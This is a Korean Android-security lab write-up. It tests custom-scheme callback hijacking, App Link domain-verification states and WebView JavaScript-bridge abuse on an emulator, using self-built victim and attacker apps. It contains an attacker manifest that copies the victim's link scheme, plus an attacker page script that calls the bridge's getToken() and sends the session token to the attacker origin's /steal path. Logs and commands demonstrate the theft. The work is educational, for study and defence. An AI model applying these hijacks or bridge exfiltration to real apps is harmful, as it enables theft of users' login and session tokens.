---
layout: post
title: "딥링크·App Link·WebView — 콜백 가로채기와 JS 브리지 실측"
date: 2026-11-04 21:00:00 +0900
category: 블로그/기술문서
author: SeiKa
tags: [Android, AndroidSecurity, 모바일보안, DeepLink, AppLink, DomainVerification, WebView, JavascriptInterface, IntentScheme, PackageVisibility]
excerpt: "Android 13에서 커스텀 스킴을 베낀 공격자 앱은 priority 999가 0으로 깎여, 사용자가 선택창에서 고르거나 원래 앱이 없을 때만 토큰을 받았다. exported WebView에서는 남이 넣은 공격자 페이지도, 앱 자기 페이지에 낀 서드파티 iframe도 JS 브리지로 세션 토큰을 꺼냈고, intent: 링크로는 export하지 않은 화면까지 열렸다."
---

[앞 글](/posts/android-lab-p1c19-pendingintent-uri-grant/)에서는 PendingIntent와 URI grant가 남의 이름으로 권한을 내주는 경로를 봤다. 앱 바깥에서 들어오는 링크와 앱 안에서 웹 콘텐츠를 띄우는 WebView는 둘 다 외부에서 온 문자열 하나가 앱의 어떤 코드까지 닿느냐의 문제다. 커스텀 스킴(`seikalab://`)은 누구나 등록할 수 있는데, 실제로 다른 앱이 콜백을 가로채려면 무엇이 더 필요한지가 이번 실습에서 처음 생각과 달랐다. https 링크는 도메인 검증을 거쳐야 앱으로 오고, WebView는 JavaScript 브리지와 파일 접근과 `intent:` 처리를 어떻게 켜 두었느냐에 따라 웹 페이지가 앱의 권한으로 움직인다.

선수 개념은 [패키지 가시성과 URI 권한(Atlas C11)](/posts/android-concept-atlas-c11-package-visibility-uri-permission/), [WebView·딥링크·IPC 공격면(Atlas C47)](/posts/android-concept-atlas-c47-webview-deeplink-ipc-attack-surface/), [HexTree Android 트랙의 WebView·딥링크 실습](/posts/hextree-android-track/), [Activity·Intent 주입(15장)](/posts/android-lab-p1c15-activity-intent-injection/)이다.

## 같은 링크를 노리는 LinkLab과 LinkThief

피해자 `io.seika.linklab`(LinkLab, 디버그 키, targetSdk 33)과 공격자 `io.seika.linkthief`(LinkThief, 다른 서명키)를 직접 만들었다. 측정은 Android 13 에뮬레이터(`codex-atlas-api33`, API 33 google_apis x86_64, 보안 패치 2024-03-01, WebView 109.0.5414.123)에서 했고, `adb shell`은 unroot 상태(uid 2000)로 두었다. 호스트에는 작은 파이썬 서버를 띄워 `127.0.0.1:8720`을 앱 자신의 웹 origin, `8721`을 공격자 origin으로 썼다. 에뮬레이터에서는 각각 `http://10.0.2.2:8720`, `http://10.0.2.2:8721`로 보인다.

LinkLab 매니페스트에서 링크와 관련된 부분이다.

```xml
<!-- apps/linklab/AndroidManifest.xml 발췌 -->
<!-- login callback over a custom scheme: seikalab://cb?token=... -->
<activity android:name=".CallbackActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="seikalab" android:host="cb" />
    </intent-filter>
</activity>

<!-- App Link: https://links.seika.test/open... (autoVerify) -->
<activity android:name=".LinkActivity" android:exported="true">
    <intent-filter android:autoVerify="true">
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="https" android:host="links.seika.test" android:pathPrefix="/open" />
    </intent-filter>
</activity>

<!-- vulnerable WebView: url from extra "url" or seikalab://web?url=... -->
<activity android:name=".WebActivity" android:exported="true"> ... </activity>

<!-- fixed WebView: origin allowlist, no bridge, no file access, sanitized intent: -->
<activity android:name=".SafeWebActivity" android:exported="true" />

<!-- internal screen, not exported -->
<activity android:name=".InternalActivity" android:exported="false" />
```

LinkThief는 같은 스킴과 같은 https 호스트를 베껴 등록한다. 스킴 쪽 필터에는 `android:priority="999"`를 붙였고, https 쪽에는 `autoVerify`가 없다. 별도로 `AttackActivity`가 extra `mode`에 따라 LinkLab의 `WebActivity`, `InternalActivity`, `LinkActivity`에 명시적 Intent를 보낸다.

```xml
<!-- apps/linkthief/AndroidManifest.xml 발췌 -->
<queries>
    <package android:name="io.seika.linklab" />
</queries>
<activity android:name=".ThiefActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="seikalab" android:host="cb" />
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="https" android:host="links.seika.test" />
    </intent-filter>
</activity>
```

## seikalab:// 콜백을 가로채려면 사용자가 골라 줘야 했다

처음 생각은 단순했다. 커스텀 스킴에는 소유자 개념이 없으니, 같은 스킴을 우선순위 높게 등록한 앱이 콜백을 조용히 가져갈 거라고 봤다. 소유자 검사가 없다는 데까지는 맞다. Android 13의 도메인 검증 필터는 `intent.isWebIntent()`이고 호스트가 있는 Intent에만 걸리고([DomainVerificationUtils.java L51-64](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/pm/verify/domain/DomainVerificationUtils.java#51)), 그 밖의 Intent는 후보가 전부 결과에 들어간다([ComputerEngine.java L1067-1074](https://cs.android.com/android/platform/superproject/+/android-13.0.0_r84:frameworks/base/services/core/java/com/android/server/pm/ComputerEngine.java;l=1067)). `seikalab:` 링크를 두고 누가 진짜 주인인지 묻는 코드는 어디에도 없다.

두 앱을 설치하고 셸에서 콜백 링크를 쏴 봤다.

```bash
S=emulator-5600
adb -s $S install out/linklab.apk
adb -s $S install out/linkthief.apk
adb -s $S shell pm list packages -U io.seika
adb -s $S shell pm query-activities --brief -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d seikalab://cb?token=LAB-OAUTH-1234
adb -s $S logcat -c
adb -s $S shell am start -W -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d seikalab://cb?token=LAB-OAUTH-1234
```

![두 앱 설치 후 pm list packages가 linklab uid 10179와 linkthief uid 10180을 보이고, query-activities가 seikalab://cb에 LinkLab CallbackActivity와 LinkThief ThiefActivity 두 개를 모두 priority=0으로 나열하며, am start -W 결과 Activity가 android/com.android.internal.app.ResolverActivity인 터미널](/assets/img/android-mastery/p1c20/10-device-scheme.png)

두 군데가 예상과 달랐다. 매니페스트에 999로 적은 LinkThief의 우선순위가 `priority=0`으로 나온다. 그리고 `am start`가 도착한 곳은 시스템 선택창인 `ResolverActivity`였다. 우선순위가 깎이는 이유는 [`ComponentResolver.adjustPriority`](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/pm/resolution/ComponentResolver.java#492)에 있다. 권한 있는(privileged) 시스템 앱이 아니면 0보다 큰 우선순위를 둘 수 없다는 주석과 함께 `setPriority(0)`을 호출한다.

![AOSP android-13.0.0_r84 ComponentResolver.java 492~515행 adjustPriority 함수. intentFilter.getPriority()가 0 이하면 그대로 두고, privilegedApp이 아니면 "non-privileged applications can never define a priority >0" 주석 뒤 intentFilter.setPriority(0)을 호출하는 코드](/assets/img/android-mastery/p1c20/03-src-a13-priority-cap.png)

우선순위가 같은 후보가 둘이니 시스템은 사용자에게 묻는다. 화면에는 "Open with" 시트가 떴고, 아무것도 고르지 않은 상태라 "Just once"와 "Always"는 비활성이었다.

![에뮬레이터 홈 화면 위에 뜬 Open with 시트. LinkLab과 LinkThief 두 줄이 같은 기본 안드로이드 아이콘으로 나열되고 아래 Just once와 Always 버튼이 회색으로 비활성](/assets/img/android-mastery/p1c20/11-device-chooser.png)

여기서 LinkThief를 고르고 "Just once"를 눌러야 비로소 토큰이 공격자 화면에 찍혔다. 선택창에서 그렇게 누른 뒤 로그를 읽었다.

```bash
adb -s $S logcat -d -v tag -s LINKTHIEF LINKLAB
```

![LinkThief 화면에 LinkThief ThiefActivity, received data=seikalab://cb?token=LAB-OAUTH-1234, stolen token=LAB-OAUTH-1234, referrer=android-app://com.android.shell 줄이 표시된 모습](/assets/img/android-mastery/p1c20/12-device-thief-token.png)

logcat에도 같은 내용이 남는다.

```
W/LINKTHIEF: LinkThief ThiefActivity
W/LINKTHIEF: received data=seikalab://cb?token=LAB-OAUTH-1234
W/LINKTHIEF: stolen token=LAB-OAUTH-1234
W/LINKTHIEF: referrer=android-app://com.android.shell
```

대조를 위해 LinkLab을 지우고 토큰만 바꾼 같은 링크를 다시 쏜 뒤, LinkLab을 다시 설치했다.

```bash
adb -s $S uninstall io.seika.linklab
adb -s $S shell am start -W -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d seikalab://cb?token=LAB-OAUTH-5678
adb -s $S logcat -d -v tag -s LINKTHIEF
adb -s $S install out/linklab.apk
adb -s $S shell pm list packages -U io.seika
```

LinkLab이 없을 때는 선택창 없이 바로 `io.seika.linkthief/.ThiefActivity`가 떴고 `stolen token=LAB-OAUTH-5678`이 찍혔다. 그러니 Android 13에서 커스텀 스킴 하이재크가 성립하는 경우는 사용자가 선택창에서 잘못 고르거나, 예전에 "Always"로 공격자 앱을 기본값으로 박아 두었거나, 진짜 앱이 아직 설치되지 않은 경우다. 마지막 경우가 생각보다 현실적이다. 로그인 흐름이 브라우저에서 시작돼 앱으로 돌아오는 구조라면, 앱이 없는 기기에 같은 스킴을 가진 앱이 깔려 있기만 하면 된다. 다시 설치한 LinkLab은 uid가 10179에서 10181로 바뀌었다.

## https 링크는 도메인 검증 상태가 행선지를 정한다

App Link는 같은 문제를 도메인 소유로 푼다. `autoVerify="true"`인 https 필터를 가진 앱을 설치하면 시스템 검증기가 `https://<호스트>/.well-known/assetlinks.json`을 받아 앱 서명 인증서 지문과 맞춰 본다([Android App Links 검증 문서](https://developer.android.com/training/app-links/verify-android-applinks)). LinkLab이 올렸어야 할 선언문과 두 APK의 실제 서명 지문을 나란히 놓으면, 공격자가 같은 호스트를 매니페스트에 적어도 왜 통과할 수 없는지 보인다. 선언문의 지문은 LinkLab 키(`766e4a…feb1`)이고 LinkThief는 `863afb…0d9a`다.

![cat www/assetlinks.json 출력에 package_name io.seika.linklab과 sha256_cert_fingerprints 76:6E:4A:4C:...:D2:FE:B1이 있고, apksigner verify --print-certs로 linklab.apk는 766e4a4c...5b9d2feb1, linkthief.apk는 863afb43...ae1a3960d9a SHA-256 다이제스트가 나온 터미널](/assets/img/android-mastery/p1c20/02-host-assetlinks.png)

이 실습의 `links.seika.test`는 DNS도 TLS도 없는 이름이라 진짜 검증은 일어날 수 없다. 에뮬레이터에 DNS 우회와 신뢰받는 인증서를 심으면 가능하겠지만 이번에는 하지 않았다. 대신 검증이 실패한 상태가 어떻게 보이는지부터 확인했다.

```bash
adb -s $S shell pm verify-app-links --re-verify io.seika.linklab
sleep 20
adb -s $S shell pm get-app-links --user 0 io.seika.linklab
adb -s $S shell pm get-app-links --user 0 io.seika.linkthief
adb -s $S shell pm resolve-activity --brief --query-flags 0x10000 -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d https://links.seika.test/open?x=1
```

![pm get-app-links 결과 io.seika.linklab의 Signatures 76:6E:...:FE:B1과 Domain verification state links.seika.test: 1024, User 0 Selection state Disabled links.seika.test. linkthief는 User 0 블록에 Disabled links.seika.test만 있고, resolve-activity가 com.android.chrome/com.google.android.apps.chrome.IntentDispatcher를 고른 터미널](/assets/img/android-mastery/p1c20/20-device-applink-state.png)

상태값은 `1024`라는 숫자로 나왔다. 숫자가 낯설어 소스를 찾아보니 `DomainVerificationState.STATE_FIRST_VERIFIER_DEFINED = 0b10000000000`(1024)이었다([DomainVerificationState.java L97](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/content/pm/verify/domain/DomainVerificationState.java#97)). 검증 에이전트가 실패를 기록할 때 쓰는 값의 시작점이고, 이 범위의 값은 전부 미검증으로 취급한다고 적혀 있다([DomainVerificationInfo.java L82-88](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/content/pm/verify/domain/DomainVerificationInfo.java#82)). 검증기가 돌긴 했고 실패했다는 뜻으로 읽힌다. LinkThief 쪽은 `autoVerify` 도메인이 없으니 패키지 헤더와 서명 줄 없이 사용자 선택 블록만 나온다.

`resolve-activity`에 `--query-flags 0x10000`(MATCH_DEFAULT_ONLY)을 붙인 것은 `am start`와 같은 조건으로 해석시키려는 것이다. 카테고리가 BROWSABLE 하나뿐인 이 질의에서는 이 플래그가 없으면 App Link 처리를 건너뛴다([DomainVerificationUtils.java L76-84](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/pm/verify/domain/DomainVerificationUtils.java#76)). 결과는 Chrome의 `IntentDispatcher`였고, 두 앱은 어느 쪽도 뽑히지 않았다. Android 12부터 웹 Intent는 그 도메인에 승인된 앱이 있을 때만 앱으로 가고, 없으면 기본 브라우저로 간다([Android 12 동작 변경, 웹 인텐트 확인](https://developer.android.com/about/versions/12/behavior-changes-all#web-intent-resolution)). 해석 코드에서는 승인된 앱 목록이 비면 브라우저만 남기는 분기가 그 일을 한다.

![cs.android.com android-13.0.0_r84 ComputerEngine.java 1059~1098행. isDomainVerificationIntent가 아니면 undefinedList를 전부 더하고 includeBrowser = true, 맞으면 mDomainVerificationManager.filterToApprovedApp을 부르고 "If no apps are approved for the domain, resolve only to browsers" 주석 아래 approvedInfos가 비면 includeBrowser = true로 두는 코드](/assets/img/android-mastery/p1c20/04-src-a13-applink-browser-only.png)

브라우저만 남기는 분기는 [ComputerEngine.java L1082-1088](https://cs.android.com/android/platform/superproject/+/android-13.0.0_r84:frameworks/base/services/core/java/com/android/server/pm/ComputerEngine.java;l=1082)이고, 브라우저가 하나도 없는 기기라면 후보를 전부 돌려준다는 분기도 있다([L1145-1147](https://cs.android.com/android/platform/superproject/+/android-13.0.0_r84:frameworks/base/services/core/java/com/android/server/pm/ComputerEngine.java;l=1145)). 이 이미지에는 Chrome이 있어서 그쪽은 관측하지 못했다.

## 검증은 암시적 해석만 바꾼다

도메인 검증이 실패한 상태(1024)에서 `LinkActivity`를 컴포넌트 이름으로 직접 불러 보면, 검증이 막는 범위가 어디까지인지 드러난다.

```bash
adb -s $S shell id -u
adb -s $S shell pm get-app-links io.seika.linklab
adb -s $S shell am start -W -n io.seika.linklab/.LinkActivity -a android.intent.action.VIEW -d https://links.seika.test/open?from=shell
adb -s $S shell am start -W -n io.seika.linklab/.InternalActivity 2>&1 | head -4
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.linkthief/.AttackActivity --es mode link
sleep 2
adb -s $S shell am start -n io.seika.linkthief/.AttackActivity --es mode internal
sleep 2
adb -s $S logcat -d -v tag -s LINKLAB LINKTHIEF
```

![id -u 2000, links.seika.test 상태 1024인 채로 am start -n LinkActivity는 Status ok와 Activity io.seika.linklab/.LinkActivity, InternalActivity는 Permission Denial uid=2000 not exported from uid 10181. LinkThief mode=link는 LinkActivity에 data=https://links.seika.test/open?from=linkthief-explicit referrer=null로 도달하고 mode=internal은 SecurityException uid=10180 not exported from uid 10181로 막힌 터미널](/assets/img/android-mastery/p1c20/30-device-reach.png)

검증 상태와 상관없이 셸도 LinkThief도 `LinkActivity`를 열었다. 막힌 것은 `exported="false"`인 `InternalActivity`뿐이고, 셸은 `uid=2000`, LinkThief는 `uid=10180`으로 `not exported from uid 10181` 거부를 받았다. 도메인 검증은 암시적 Intent를 어느 앱으로 보낼지 고르는 단계에만 끼어든다. 명시적 Intent로 컴포넌트를 지정하면 그 단계를 거치지 않으니, 남이 이 Activity를 부를 수 있느냐는 `android:exported`가 정한다. 그래서 App Link용 Activity도 아무 앱이 아무 `https://links.seika.test/...` URL을 넣어 부를 수 있다. targetSdk 31 이상에서 intent-filter가 있는 컴포넌트에 `exported`를 명시하게 한 것은, 예전에는 필터가 있으면 기본으로 export됐기 때문이다([ParsedActivityUtils.java L464-476](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/pm/pkg/component/ParsedActivityUtils.java#464)의 `setExported(hasIntentFilters)`).

### LinkThief가 띄우면 referrer가 null이었던 이유

LinkThief가 띄운 LinkLab Activity에서는 `getReferrer()`가 매번 `null`이었다. 셸이 띄우면 `android-app://com.android.shell`, LinkLab이 자기 Activity를 띄우면 `android-app://io.seika.linklab`가 나왔다. LinkLab 매니페스트에는 LinkThief를 보는 `<queries>`가 없으니 패키지 가시성이 호출자 이름을 가린 게 아닐까 짐작했고, 프레임워크에서 그 지점을 찾았다. Activity를 실제로 띄우는 `realStartActivityLocked`가 `LaunchActivityItem`을 만들 때 referrer 자리에 `r.getFilteredReferrer(r.launchedFromPackage)`를 넘긴다([ActivityTaskSupervisor.java L912](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/wm/ActivityTaskSupervisor.java#912)). 그 함수는 호출자가 자기 패키지도 아니고 대상 앱에서 보이지도 않으면 `null`을 돌려준다.

![AOSP android-13.0.0_r84 ActivityRecord.java 9890~9901행 getFilteredReferrer. javadoc "This method returns null if the given package is not visible to this activity", referrerPackage가 null이거나 자기 packageName이 아니면서 mWmService.mPmInternal.filterAppAccess(referrerPackage, info.applicationInfo.uid, mUserId)가 참이면 return null, 아니면 referrerPackage를 돌려주는 코드](/assets/img/android-mastery/p1c20/07-src-a13-filtered-referrer.png)

[ActivityRecord.java L9890-9901](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/wm/ActivityRecord.java#9890)대로라면 LinkLab이 LinkThief를 볼 수 있게만 하면 같은 호출에서 이름이 나와야 한다. 그래서 `<queries><package android:name="io.seika.linkthief"/></queries>` 한 줄만 더하고 같은 디버그 키로 서명한 `linklab-q.apk`를 만들어, 같은 공격을 앞뒤로 돌렸다.

```bash
adb -s $S shell am force-stop io.seika.linklab
adb -s $S logcat -c
adb -s $S shell am start -S -n io.seika.linkthief/.AttackActivity --es mode link
sleep 8
adb -s $S logcat -d -v tag -s LINKLAB | grep referrer
adb -s $S install -r out/linklab-q.apk
adb -s $S logcat -c
adb -s $S shell am start -S -n io.seika.linkthief/.AttackActivity --es mode link
sleep 8
adb -s $S logcat -d -v tag -s LINKLAB | grep referrer
adb -s $S install -r out/linklab.apk
```

![LinkThief AttackActivity mode=link를 띄운 뒤 grep referrer가 I/LINKLAB : referrer=null을 보이고, adb install -r out/linklab-q.apk가 Success한 다음 같은 실행에서 I/LINKLAB : referrer=android-app://io.seika.linkthief가 나오며, 마지막에 out/linklab.apk를 다시 설치해 Success인 터미널](/assets/img/android-mastery/p1c20/32-device-referrer.png)

`<queries>` 하나로 `referrer=null`이 `android-app://io.seika.linkthief`로 바뀌었다. 처음 돌렸을 때는 두 `grep`이 모두 빈 줄이었다. 막 부팅한 에뮬레이터에서 `LinkActivity`가 뜨는 데 6.4초가 걸려 `sleep 2`로는 로그가 아직 없었던 것이고, 8초로 늘리자 위 결과가 나왔다.

referrer로는 호출자를 증명할 수 없다. 대상 앱이 무엇을 `<queries>`에 적었느냐에 따라 같은 호출의 값이 달라지니 권한 판단에 쓰면 안 된다. 보이지 않는 앱이 부르면 `null`이 되고, 호출자가 `Intent.EXTRA_REFERRER`로 값을 직접 넣을 수도 있다([Activity.getReferrer 문서](https://developer.android.com/reference/android/app/Activity#getReferrer())). 이 위조는 이번에 돌려 보지 않았다.

## 사용자 선택과 강제 승인, 누가 이기는가

다시 검증 실패(1024) 상태의 https 링크로 돌아가면, 미검증 도메인을 앱이 가져가는 길이 하나 더 있다. 사용자가 설정에서 "지원되는 링크 열기"를 켜 주는 사용자 선택이다. 셸에서 같은 상태를 만들 수 있어서 LinkThief에 먼저 켜 보고, 그다음 LinkLab을 셸에서 강제로 승인했다.

```bash
adb -s $S shell pm set-app-links-user-selection --user 0 --package io.seika.linkthief true links.seika.test
adb -s $S shell pm get-app-links --user 0 io.seika.linkthief
adb -s $S shell pm resolve-activity --brief --query-flags 0x10000 -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d https://links.seika.test/open?x=2
adb -s $S shell pm set-app-links --package io.seika.linklab STATE_APPROVED links.seika.test
adb -s $S shell pm get-app-links --user 0 io.seika.linklab
adb -s $S shell pm get-app-links --user 0 io.seika.linkthief
adb -s $S shell pm resolve-activity --brief --query-flags 0x10000 -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d https://links.seika.test/open?x=3
adb -s $S shell am start -W -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d https://links.seika.test/open?x=4
```

![linkthief에 set-app-links-user-selection true를 준 뒤 Selection state Enabled links.seika.test, resolve-activity가 io.seika.linkthief/.ThiefActivity. 이어 linklab에 STATE_APPROVED를 주자 links.seika.test: approved, linkthief는 Disabled로 돌아가고, resolve-activity와 am start -W가 모두 io.seika.linklab/.LinkActivity로 가는 터미널](/assets/img/android-mastery/p1c20/21-device-applink-approve.png)

사용자 선택만으로 미검증 LinkThief가 도메인을 가져갔다(`io.seika.linkthief/.ThiefActivity`). 승인 수준 상수에서 사용자 선택은 3, 검증은 4다([DomainVerificationManagerInternal.java L115](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/pm/verify/domain/DomainVerificationManagerInternal.java#115)). 아무도 검증되지 않은 동안에는 3이 최고점이라 LinkThief가 이긴 것이다. LinkLab을 `STATE_APPROVED`로 올리자 해석은 LinkLab으로 바뀌었고, LinkThief의 선택 상태는 `Enabled`에서 `Disabled`로 되돌아가 있었다.

처음에는 이 뒤집힘을 의외로 받아들였다. 다른 앱의 선택 취소 결과를 무시하는 셸 경로를 소스에서 본 기억이 있었는데, 다시 열어 보니 그건 `set-app-links-user-selection` 쪽 코드였다. `set-app-links`는 `DomainVerificationService`의 상태 기록 경로를 타고, 새 상태가 검증된 상태(`STATE_APPROVED`도 여기에 든다)이면서 그 도메인이 전에는 검증되지 않았다면 상태를 쓴 다음 `removeUserStatesForDomain`을 부른다. 주석에 이유가 있다. 승인된 도메인에서는 사용자 선택을 취소하는 SystemApi 동작을 그대로 따른다고 적혀 있다.

![AOSP android-13.0.0_r84 DomainVerificationService.java 429~455행. DomainVerificationState.isVerified(state)이면 이전에 검증되지 않은 도메인을 newlyVerifiedDomains에 모으고, setDomainVerificationStatusInternal 뒤 "Mirror SystemApi behavior of revoking user selection for approved domains" 주석 아래 각 도메인에 removeUserStatesForDomain(pkgState, domain)을 호출하는 코드](/assets/img/android-mastery/p1c20/08-src-a13-approve-revokes-selection.png)

[DomainVerificationService.java L429-455](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/pm/verify/domain/DomainVerificationService.java#429)를 보면 위 캡처의 `Disabled`는 소스가 의도한 결과다. 방어하는 쪽에서 보면 반가운 동작이다. 도메인 검증이 성공하는 순간 다른 앱이 사용자에게 받아 둔 선택은 그 도메인에서 사라진다. 거꾸로 말하면 검증이 실패한 채로 배포된 앱은 사용자가 공격자 앱의 "지원되는 링크 열기"를 켜는 것만으로 링크를 넘겨준다.

강제 승인에 `STATE_SUCCESS` 대신 `STATE_APPROVED`를 쓴 이유도 소스에 있다. 셸 명령 도움말이 SUCCESS는 검증 에이전트가 덮어쓸 수 있고 APPROVED는 그렇지 않다고 적는다([DomainVerificationShell.java L79-93](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/pm/verify/domain/DomainVerificationShell.java#79)). 여기서 본 `approved`는 셸로 만든 상태이고, assetlinks.json을 실제로 검증받은 결과는 아니다.

## WebView에 남이 고른 URL을 넣었을 때

LinkLab의 `WebActivity`는 일부러 흔한 실수를 모아 두었다. 받은 URL을 그대로 띄우고, JavaScript를 켜고, 브리지를 붙이고, 파일 접근을 켜고, `intent:` 링크를 직접 파싱해 실행한다. 설정을 바꾸기 전에 기본값부터 로그로 남긴다.

```java
// apps/linklab/src/io/seika/linklab/WebActivity.java 발췌
String url = getIntent().getStringExtra("url");
...
WebView wv = new WebView(this);
WebSettings s = wv.getSettings();
Log.i(Ui.TAG, "WebActivity defaults: javaScriptEnabled=" + s.getJavaScriptEnabled()
        + " allowFileAccess=" + s.getAllowFileAccess()
        + " allowFileAccessFromFileURLs=" + s.getAllowFileAccessFromFileURLs()
        + " allowUniversalAccessFromFileURLs=" + s.getAllowUniversalAccessFromFileURLs()
        + " targetSdk=" + getApplicationInfo().targetSdkVersion);
s.setJavaScriptEnabled(true);
s.setAllowFileAccess(true);
wv.addJavascriptInterface(new Bridge(), "SeikaBridge");
...
if (url != null) wv.loadUrl(url);
```

브리지 객체에는 어노테이션이 붙은 메서드 둘과, `public`이지만 어노테이션이 없는 메서드 하나가 있다.

```java
// apps/linklab/src/io/seika/linklab/Bridge.java
public class Bridge {
    static final String TOKEN = "LAB-SESSION-7f3a91";

    @JavascriptInterface
    public String getToken() {
        Log.w(Ui.TAG, "Bridge.getToken() called thread=" + Thread.currentThread().getName()
                + " -> returning session token");
        return TOKEN;
    }

    @JavascriptInterface
    public void log(String s) {
        Log.i(Ui.TAG, "Bridge.log(" + s + ") thread=" + Thread.currentThread().getName());
    }

    /** public but NOT annotated: must stay invisible to JavaScript (targetSdk >= 17). */
    public String deleteAccount() {
        Log.e(Ui.TAG, "Bridge.deleteAccount() called");
        return "deleted";
    }
}
```

공격자 페이지(`8721/evil/bridge.html`)는 브리지가 있는지 보고, 열거되는 메서드 이름을 찍고, `getToken()`을 불러 결과를 이미지 요청으로 자기 서버에 보낸다.

```html
<!-- www/8721/evil/bridge.html 의 script 부분 -->
p('origin='+location.origin+' topFrame='+(window===top));
p('typeof SeikaBridge='+typeof SeikaBridge);
if(typeof SeikaBridge!=='undefined'){
  var ks=[];for(var k in SeikaBridge)ks.push(k);
  p('enumerable='+ks.join(','));
  p('typeof deleteAccount='+typeof SeikaBridge.deleteAccount);
  var t=SeikaBridge.getToken();
  p('getToken()='+t);
  new Image().src='/steal?token='+encodeURIComponent(t)+'&frame='+(window===top?'top':'iframe');
  p('sent to '+location.origin+'/steal');
}
```

LinkThief는 LinkLab의 exported `WebActivity`에 이 URL을 extra로 넣어 명시적 Intent를 보낼 뿐이다. 셸에서는 LinkThief의 `AttackActivity`를 띄워 그 동작을 시켰다.

```bash
adb -s $S shell am force-stop io.seika.linklab
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.linkthief/.AttackActivity --es mode web
sleep 5
adb -s $S logcat -d -v tag -s LINKLAB LINKTHIEF
cat raw/server.log
```

![LinkThief AttackActivity mode=web이 io.seika.linklab/.WebActivity를 연 뒤 LINKLAB 로그에 defaults javaScriptEnabled=false allowFileAccess=false targetSdk=33, console typeof SeikaBridge=object, enumerable=getToken,log, typeof deleteAccount=undefined, Bridge.getToken() called thread=JavaBridge, getToken()=LAB-SESSION-7f3a91가 찍히고 server.log에 :8721 GET /steal?token=LAB-SESSION-7f3a91&frame=top이 남은 터미널](/assets/img/android-mastery/p1c20/40-device-bridge.png)

공격자 origin(`http://10.0.2.2:8721`)이 최상위 프레임으로 LinkLab 안에 떴고, `SeikaBridge`는 `object`였다. `for-in`으로 보이는 메서드는 `getToken,log` 둘뿐이고 `deleteAccount`는 `undefined`다. targetSdk가 17(JELLY_BEAN_MR1) 이상인 앱에서는 `@JavascriptInterface`가 붙은 public 메서드만 노출된다는 규칙대로다([JavascriptInterface.java L25](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/webkit/JavascriptInterface.java#25)). Java 쪽 호출은 `JavaBridge`라는 백그라운드 스레드에서 실행됐으니, 브리지가 앱 상태를 건드린다면 동기화도 신경 써야 한다. 공격에는 노출된 `getToken()` 하나로 충분했고, 세션 토큰 `LAB-SESSION-7f3a91`이 공격자 서버 로그에 도착했다.

LinkLab 화면에는 분홍색 공격자 페이지가 앱 제목 표시줄 아래에 떠 있어서, 사용자는 앱의 다른 화면과 구분할 수 없다.

![LinkLab 제목 아래 분홍 배경의 attacker page (port 8721) 페이지. origin=http://10.0.2.2:8721 topFrame=(오른쪽 잘림), typeof SeikaBridge=object, enumerable=getToken,log, typeof deleteAccount=undefined, getToken()=LAB-SESSION-7f3a91, sent to http://10.0.2.2:8721/steal 줄이 보이는 화면](/assets/img/android-mastery/p1c20/41-device-bridge-webview.png)

Android 4.2 미만 기기에서는 어노테이션과 상관없이 리플렉션으로 주입 객체를 타고 임의 Java 코드를 실행할 수 있었다는 경고가 `addJavascriptInterface` 문서에 있다. API 16 이하 이미지가 없어서 이 부분은 돌려 보지 못했다.

## 메인 프레임을 믿어도 iframe이 같은 브리지를 부른다

URL 검사를 최상위 페이지에만 거는 앱이 많다. 그래서 자기 origin(8720)의 뉴스 페이지가 광고나 위젯처럼 서드파티(8721) iframe을 품는 경우를 만들었다. 이번에는 LinkThief 없이 셸에서 LinkLab의 자기 페이지를 띄웠다.

```bash
adb -s $S logcat -c
adb -s $S shell am start -S -n io.seika.linklab/.WebActivity --es url http://10.0.2.2:8720/app/frame.html
sleep 5
adb -s $S logcat -d -v tag -s LINKLAB
tail -n 3 raw/server.log
```

```
I/LINKLAB : WebActivity url=http://10.0.2.2:8720/app/frame.html referrer=android-app://com.android.shell
I/LINKLAB : console: frame.html top origin=http://10.0.2.2:8720
I/LINKLAB : console: origin=http://10.0.2.2:8721 topFrame=false
I/LINKLAB : console: typeof SeikaBridge=object
W/LINKLAB : Bridge.getToken() called thread=JavaBridge -> returning session token
I/LINKLAB : console: enumerable=getToken,log
I/LINKLAB : console: typeof deleteAccount=undefined
I/LINKLAB : console: getToken()=LAB-SESSION-7f3a91
I/LINKLAB : console: sent to http://10.0.2.2:8721/steal
I/LINKLAB : onPageFinished http://10.0.2.2:8720/app/frame.html
